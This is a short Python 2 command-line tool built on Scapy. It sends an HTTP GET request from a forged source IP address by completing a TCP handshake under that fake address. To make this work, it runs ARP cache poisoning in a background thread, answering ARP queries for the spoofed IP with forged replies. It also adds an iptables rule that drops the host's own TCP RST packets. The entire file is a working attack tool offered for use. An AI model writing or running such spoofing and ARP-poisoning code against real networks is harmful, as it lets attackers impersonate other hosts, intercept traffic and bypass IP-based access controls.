#!/usr/bin/python

from scapy.all import *
import thread
import argparse


class SpoofedTCPIPConnection(object):
    """
    Performs TCP handshake from an arbitrary IP and allows sending data through the resulting "socket".
     Uses ARP poisoning to allow arbitary source IP.
     Does not maintain the TCP "socket" - it will not ACK the other side or retransmit on failure.
    """

    def __init__(self, src_ip, src_port, dst_ip, dst_port):
        self.dst_port = dst_port
        self.dst_ip = dst_ip
        self.src_port = src_port
        self.src_ip = src_ip
        self._seq_num = random.randint(1, 65535)
        self._ack = 0
        self._ip = IP(src=self.src_ip, dst=self.dst_ip)

    def connect(self):
        """
        performs TCP handshake
        """
        self._configure_iptables()
        self.arp_thread_id = thread.start_new_thread(self._poison_arp, ())
        self._handshake()

    def close(self):
        """
        Clears iptables, used for dropping the OS' RST packets.
        """
        self._clear_OS_iptables()

    def send_data(self, data):
        """
        wraps the given data in a tcp packet and sends it.
        :param data: data to send. assumed to fit in one packet.
        """
        pckt = self._ip / TCP(sport=self.src_port, dport=self.dst_port,
                              seq=self._seq_num, ack=self._ack, flags='A') / data
        self._seq_num += len(data)
        response = sr1(pckt)
        if Padding in response:
            self._ack = response[TCP].seq + len(response[TCP].payload) - len(response[Padding])
        else:
            self._ack = response[TCP].seq + len(response[TCP].payload)

        print "ack = %d" % (self._ack)
        print response.show()

    def _handshake(self):
        syn_pckt = self._ip / TCP(sport=self.src_port, dport=self.dst_port, flags='S',
                                  seq=self._seq_num)
        synack = sr1(syn_pckt)

        self._seq_num += 1

        if TCP in synack and synack[TCP].flags & (2 | 16):
            print "RCVED SYNACK"
            self._ack = synack[TCP].seq + 1
            ack_pckt = self._ip / TCP(sport=self.src_port, dport=self.dst_port, flags='A',
                                      seq=synack.ack, ack=synack.seq + 1)
            send(ack_pckt)

        else:
            raise RuntimeError("SYNACK invalid")

    def _configure_iptables(self):
        """
        add a rule to drop outgoing RST tcp packets, so linux doesn't restart our connection
        """
        os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')

    def _clear_OS_iptables(self):
        os.system('iptables --flush OUTPUT')

    def _poison_arp(self):

        def arp_callback(packet):
            # print packet.show()

            if ARP in packet and packet.op == ARP.who_has and packet.pdst == self.src_ip:
                self._send_arp_response(packet.psrc)

        sniff(prn=arp_callback, filter='arp')

    def _send_arp_response(self, dest_ip):
        arp_pckt = ARP(hwdst='ff:ff:ff:ff:ff:ff', op=ARP.is_at, psrc=self.src_ip, pdst=dest_ip)
        send(arp_pckt)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Send HTTP Request from fake IP address to specified destination')
    parser.add_argument('-s', '--src', type=str, nargs=1,
                        help='source  IP')
    parser.add_argument('-d', '--dst', type=str, nargs=1,
                        help='destination IP')
    parser.add_argument('-m', '--msg', type=str, nargs=1,
                        help='path')
    args = parser.parse_args()

    src_ip = args.src[0]
    dst_ip = args.dst[0]
    path = args.msg[0]
    src_port = random.randint(1025, 65535)
    dst_port = 8080

    print "Connecting from %s to %s, sending http GET for %s" % (src_ip, dst_ip, path)

    c = SpoofedTCPIPConnection(src_ip, src_port, dst_ip, dst_port)

    c.connect()
    c.send_data('GET %s HTTP/1.0\r\n\r\n' % path)

    c.close()
